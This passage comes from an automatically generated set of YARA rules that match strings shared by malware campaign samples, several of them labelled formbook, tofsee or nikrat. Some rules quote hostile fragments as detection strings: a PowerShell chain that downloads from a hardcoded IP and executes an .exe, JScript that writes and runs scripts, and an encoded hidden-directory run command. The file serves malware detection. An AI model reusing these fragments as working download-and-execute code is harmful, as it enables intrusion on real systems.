        $s11 = "bCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDI5MS11bml4Ly5yc3luYy9pbml0YWxsIDI+MSYKZXhpdCAw\" | base" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 5202384 and 12 of them
}

rule Sightlines_tlsh_54e23a64_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-54e23a64"
        date = "2026-10-30"
        campaign = "tlsh-54e23a64"
        family = ""
        hash = "0254d77fb5b0561bc5a2e9a01cf47e8387f73adb9e18ff336867186c89cd660f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-54e23a64.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/lib/libSystem.B.dylib" ascii
        $s1 = "_realpath$DARWIN_EXTSN" ascii
        $s2 = "__mh_execute_header" ascii
        $s3 = "___stack_chk_guard" ascii
        $s4 = "____chkstk_darwin" ascii
        $s5 = "___stack_chk_fail" ascii
        $s6 = "/tmp/log_de.log" ascii
        $s7 = "_gethostbyname" ascii
        $s8 = "/tmp/.X1-unix" ascii
        $s9 = "[kworker/0:2]" ascii
        $s10 = "/usr/lib/dyld" ascii
        $s11 = "__unwind_info" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a6e844e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a6e844e1"
        date = "2026-10-30"
        campaign = "imphash-a6e844e1"
        family = ""
        hash = "5dee24569905b01acb7bff4a3e1e4b334ddaf295a6db6faf44b2afaa3d7540e3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a6e844e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "VTEnumerator<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>L\"D" ascii
        $s5 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s6 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s10 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s11 = ";TDictionary<System.string,System.Cardinal>.TValueEnumeratorPvH" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17361024 and 12 of them
}

rule Sightlines_contacted_0ad9e3c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-0ad9e3c5"
        date = "2026-10-31"
        campaign = "contacted-0ad9e3c5"
        family = ""
        hash = "1a6accff44320788df5d4aaa5befd1aa524ca24715f76155eaf9558b5acdb0d0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-0ad9e3c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"10.0.0.0\" processorArchitecture=\"amd64\" name=\"Contoso.BackgroundUpdate\"" ascii
        $s1 = "      <supportedOS Id=\"{4f476546-937d-4f2f-b4bf-9f40a04d5b62}\"/>" ascii
        $s2 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s3 = "  <description>Background Update Service</description>" ascii
        $s4 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s5 = "Partial loss of significance (PLOSS)" ascii
        $s6 = "Total loss of significance (TLOSS)" ascii
        $s7 = "api-ms-win-crt-private-l1-1-0.dll" ascii
        $s8 = "Overflow range error (OVERFLOW)" ascii
        $s9 = "Argument domain error (DOMAIN)" ascii
        $s10 = "Argument singularity (SIGN)" ascii
        $s11 = "NtAllocateVirtualMemory" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11019884 and 12 of them
}

rule Sightlines_imphash_ecfe772f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-ecfe772f"
        date = "2026-10-30"
        campaign = "imphash-ecfe772f"
        family = ""
        hash = "05a6ae375ef48f48f368aa71b7b1aaabd99a55bf9a857c4f0caf57a2878cea27"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-ecfe772f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"> " ascii
        $s1 = " deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly " ascii
        $s2 = " inflate 1.1.4 Copyright 1995-2002 Mark Adler " ascii
        $s3 = "SOFTWARE\\Microsoft\\.NETFramework\\policy" ascii
        $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" ascii
        $s5 = "\\Microsoft\\Internet Explorer\\Quick Launch" ascii
        $s6 = "  <description>Smart Install Maker - create setup software</description>" ascii
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\GrpConv\\MapGroups" ascii
        $s8 = "        <requestedExecutionLevel level=\"requireAdministrator\"/>" ascii
        $s9 = "The setup files are corrupted. Please obtain a new copy of the program." ascii
        $s10 = "oversubscribed dynamic bit lengths tree" ascii
        $s11 = "This program must be run under Win32" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3687060 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_a6afbb2b_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-a6afbb2b"
        date = "2026-10-27"
        campaign = "dotnet_typelib_guid-a6afbb2b"
        family = "formbook"
        hash = "3c217eeecaa616ad300b86fe00f2ddebeb05cba3dfb4c33f3c716f0f162c282c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-a6afbb2b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "Thermal Yield: ~{0:0.00} MWh equivalent domestic heating output" wide
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "Audit exported successfully matching PeatBankData.xsd schema." wide
        $s5 = "Final Slab MC: {0:0.0}% moisture content" wide
        $s6 = "Bank Advance : {0:0.00} m stripped & harvested along face" wide
        $s7 = "Bank Section: 45.0m Face | 2 Cutters | Tairsgear" wide
        $s8 = "Rate: 260 Slabs/hr | Carting: Wheelbarrow" wide
        $s9 = "Face for Next: {0:0.00} m viable bank face preserved for next season" wide
        $s10 = "Weather Days : {0} drying days | {1} downpour days | {2} midge days" wide
        $s11 = "Cutting Tool : {0} ({1} active cutters)" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 7429120 and 12 of them
}

rule Sightlines_imphash_945e812e_nikrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-945e812e"
        date = "2026-10-30"
        campaign = "imphash-945e812e"
        family = "nikrat"
        hash = "09ac4a095622cc699022c5ecb83234df2b7dbf3035f1dc6fb439dc1e0059a480"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-945e812e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR environment variable is not defined!" ascii
        $s1 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" ascii
        $s2 = " inflate 1.3.2 Copyright 1995-2026 Mark Adler " ascii
        $s3 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s4 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s5 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s7 = "SPLASH: length of Tk module directory path exceeds maximum path length!" ascii
        $s8 = "Could not allocate memory for DYLIB_PYTHON structure." ascii
        $s9 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s10 = "SPLASH: length of Tcl module directory path exceeds maximum path length!" ascii
        $s11 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 20651632 and 12 of them
}

rule Sightlines_tlsh_f2cc54d3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f2cc54d3"
        date = "2026-10-31"
        campaign = "tlsh-f2cc54d3"
        family = ""
        hash = "1f546f1b4b2cd404fdd2ba9b52223ecf935ad26588993f703bef69db4c94034e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f2cc54d3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "LuaJIT 2.1.0-beta3 -- Copyright (C) 2005-2017 Mike Pall. http://luajit.org/" ascii
        $s1 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s2 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s3 = "  -j cmd    Perform LuaJIT control command." ascii
        $s4 = "  -i        Enter interactive mode after executing 'script'." ascii
        $s5 = "  -         Execute stdin and stop handling options." ascii
        $s6 = "  -E        Ignore environment variables." ascii
        $s7 = "cannot create state: not enough memory" ascii
        $s8 = "  -e chunk  Execute string 'chunk'." ascii
        $s9 = "  -v        Show version information." ascii
        $s10 = "  -l name   Require library 'name'." ascii
        $s11 = "(error object is not a string)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_6ca30fb6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6ca30fb6"
        date = "2026-10-31"
        campaign = "tlsh-6ca30fb6"
        family = ""
        hash = "04dc80d84f1452dc76e1962c10da1420a9d5ceb6e3a03691d274f98043ba74af"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6ca30fb6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "unknown or malformed optimization flag '%s'" ascii
        $s2 = "PANIC: unprotected error in call to Lua API (" ascii
        $s3 = "ambiguous syntax (function call x new statement)" ascii
        $s4 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s5 = "attempt to yield across C-call boundary" ascii
        $s6 = "NYI: cannot call this C function (yet)" ascii
        $s7 = "wrong number of arguments for function call" ascii
        $s8 = "runtime code generation failed, restricted kernel?" ascii
        $s9 = "attempt to perform arithmetic on '%s' and '%s'" ascii
        $s10 = "'setfenv' cannot change environment of given object" ascii
        $s11 = "'%s' expected (to close '%s' at line %d)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1134592 and 12 of them
}

rule Sightlines_tlsh_36d419ba_tofsee
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-36d419ba"
        date = "2026-10-30"
        campaign = "tlsh-36d419ba"
        family = "tofsee"
        hash = "03e59347177d7812a8d25c086d86d1b76ffce67c434855a6524971334f5a9f77"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-36d419ba.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "Embarcadero Delphi for Win32 compiler version 36.0 (29.0.55362.2017)" ascii
        $s5 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s6 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s8 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s10 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>@" ascii
        $s11 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 32595032 and 12 of them
}

rule Sightlines_tlsh_4ad2c20d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4ad2c20d"
        date = "2026-10-27"
        campaign = "tlsh-4ad2c20d"
        family = ""
        hash = "0e15469a86b39edd8d3b3277b716a627f3ced62f898fcee6f724920cb2729fc0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4ad2c20d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$env:TEMP\\\"+[IO.Path]::GetRandomFileName()+\".exe\";[IO.File]::WriteAllBytes($p,$d);Start-Process $p -" ascii
        $s1 = "$c=(New-Object Net.WebClient).DownloadData('http://176.65.144.144/assets/logo.png');$k=[Convert]::Fr" ascii
        $s2 = "WindowStyle 1}" ascii
    condition:
        filesize < 1048576 and 3 of them
}

rule Sightlines_rich_header_hash_cfa5b362_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-cfa5b362"
        date = "2026-10-30"
        campaign = "rich_header_hash-cfa5b362"
        family = ""
        hash = "1dcc54cd1aa45779e487f0dd46c96280c70c9ea370416ea15a11be92b4318017"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-cfa5b362.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "{7>8cE>kV#)WzH" ascii
        $s1 = "Sn_bC~Ora\\%" ascii
        $s2 = "#GK*5A?^CCM" ascii
        $s3 = "aJ1l{[}3c" ascii
        $s4 = "%LI%O*Oo9" ascii
        $s5 = "M S#7YQ0" ascii
        $s6 = "M#S:7PQ9" ascii
        $s7 = "i3VM>]}W" ascii
        $s8 = "q3ZM\"]3W" ascii
        $s9 = "zIsSs??7" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1208400 and 6 of them
}

rule Sightlines_tlsh_e493d4e4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e493d4e4"
        date = "2026-10-30"
        campaign = "tlsh-e493d4e4"
        family = ""
        hash = "568efea6410f079966fc0497c5b154955f0a7f7a3156b07c3725d62e29dd5c6c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e493d4e4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    var http = new ActiveXObject('MSXML2.XMLHTTP');" ascii
        $s1 = "    var fs = new ActiveXObject('Scripting.FileSystemObject');" ascii
        $s2 = "    var sh = new ActiveXObject('WScript.Shell');" ascii
        $s3 = "        var randPart = Math.random().toString(36).substring(2, 10);" ascii
        $s4 = "        var handle = fs.CreateTextFile(filePath, true);" ascii
        $s5 = "                return runPowerShell(script, config.directory);" ascii
        $s6 = "            writeFile(path, scriptContent);" ascii
        $s7 = "        var name = generateFileName();" ascii
        $s8 = "        handle.Write(content);" ascii
        $s9 = "    this.ScriptAPI = Api;" ascii
        $s10 = "    // Expose globally" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_890d3f0e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-890d3f0e"
        date = "2026-10-30"
        campaign = "tlsh-890d3f0e"
        family = ""
        hash = "22b4dd9438c69fedebb1403362590bb8679b01a17c51b4dffa1ffcb2119a93ce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-890d3f0e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "GCC: (Rev5, Built by MSYS2 project) 16.1.0" ascii
        $s2 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s3 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s5 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s6 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s7 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s8 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s9 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s10 = "Error cleaning up spin_keys for thread %lu." ascii
        $s11 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_imphash_8c072b69_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8c072b69"
        date = "2026-10-30"
        campaign = "imphash-8c072b69"
        family = ""
        hash = "2b4a042dbe3d15182847f16e183fe1b504ff4f5c79d1b8cfd17777919beed52a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8c072b69.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s2 = "; enable processing of empty tcp packets without flags SYN,RST,FIN (default : 0)" ascii
        $s3 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s4 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s5 = " tcp.PayloadLength>=12 and tcp.Payload32[0]==0x48545450 and tcp.Payload16[2]==0x2F31 and tcp.Payload" ascii
        $s6 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s7 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s8 = " deflate 1.3.1 Copyright 1995-2024 Jean-loup Gailly and Mark Adler " ascii
        $s9 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s10 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s11 = " inflate 1.3.1 Copyright 1995-2024 Mark Adler " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1312768 and 12 of them
}

rule Sightlines_imphash_7cadeb59_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7cadeb59"
        date = "2026-10-30"
        campaign = "imphash-7cadeb59"
        family = ""
        hash = "1009df9608dbf82cae10a30ff54ba80edc218c068bd544db294e1235261ecc0a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7cadeb59.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s2 = "; enable processing of empty tcp packets without flags SYN,RST,FIN (default : 0)" ascii
        $s3 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s4 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s5 = " tcp.PayloadLength>=12 and tcp.Payload32[0]==0x48545450 and tcp.Payload16[2]==0x2F31 and tcp.Payload" ascii
        $s6 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s7 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s8 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s9 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s10 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards" ascii
        $s11 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1281024 and 12 of them
}

rule Sightlines_imphash_41e979f9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-41e979f9"
        date = "2026-10-30"
        campaign = "imphash-41e979f9"
        family = ""
        hash = "195f4be6df6d6c864bf479a4dca1bc540679856c3ae5b082648db108d903bc3f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-41e979f9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "Copyright (C) 1993-2021 Werner Almesberger and Craig Small" ascii
        $s3 = "  -Z,--context REGEXP kill only process(es) having context" ascii
        $s4 = "PSmisc comes with ABSOLUTELY NO WARRANTY." ascii
        $s5 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s6 = "GCC: (GNU) 11.2.0 20210728 (Fedora Cygwin 11.2.0-2)" ascii
        $s7 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s8 = "  -s,--signal SIGNAL  send this signal instead of SIGTERM" ascii
        $s9 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s10 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s11 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a3bf3688_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a3bf3688"
        date = "2026-10-30"
        campaign = "imphash-a3bf3688"
        family = ""
        hash = "04ec49b1670f764f0a2a17752afccfadfe5b5efbcefcb9b7c7276b16f23757f3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a3bf3688.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "Copyright (C) 1993-2021 Werner Almesberger and Craig Small" ascii
        $s3 = "  -Z,--context REGEXP kill only process(es) having context" ascii
        $s4 = "PSmisc comes with ABSOLUTELY NO WARRANTY." ascii
        $s5 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s6 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s7 = "  -s,--signal SIGNAL  send this signal instead of SIGTERM" ascii
        $s8 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s9 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s10 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
        $s11 = "For more information about these matters, see the files named COPYING." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_bc91db56_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bc91db56"
        date = "2026-10-30"
        campaign = "tlsh-bc91db56"
        family = ""
        hash = "24a8ebd1e89943e7f30673660800e8dda773362e78c4ec3b7837d706cdf0c74b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bc91db56.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s3 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s4 = "invalid parameter for prefix-length : %s" ascii
        $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s6 = "invalid parameter for v4-threshold : %s" ascii
        $s7 = "invalid parameter for v6-threshold : %s" ascii
        $s8 = "option doesn't take an argument -- %.*s" ascii
        $s9 = "Partial loss of significance (PLOSS)" ascii
        $s10 = "Total loss of significance (TLOSS)" ascii
        $s11 = "option requires an argument -- %c" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_389d84d7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-389d84d7"
        date = "2026-10-30"
        campaign = "tlsh-389d84d7"
        family = ""
        hash = "05937b2eb1fdc68cd6f2af257b7cc7b63a6a319a8598b3823c086b0a8ec61944"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-389d84d7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1813632 and 12 of them
}

rule Sightlines_tlsh_1789b7eb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1789b7eb"
        date = "2026-10-30"
        campaign = "tlsh-1789b7eb"
        family = ""
        hash = "093cecb15b1df728bfa130fd6f9343fb3518ffd1e00070b852d495ce3465eb83"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1789b7eb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_50e572dc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-50e572dc"
        date = "2026-10-30"
        campaign = "tlsh-50e572dc"
        family = ""
        hash = "0de2ed09e979de3ac6f4b9fe9615ef3891182d69ceeca4fbbc874857ba02f093"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-50e572dc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aAbBcCdDeFgGhHIjmMnprRStTuUVwWxXyYzZ%||EcECExEXEyEYOdOeOHOIOmOMOSOuOUOVOwOWOy" ascii
        $s1 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s2 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s3 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s4 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s6 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s7 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s8 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
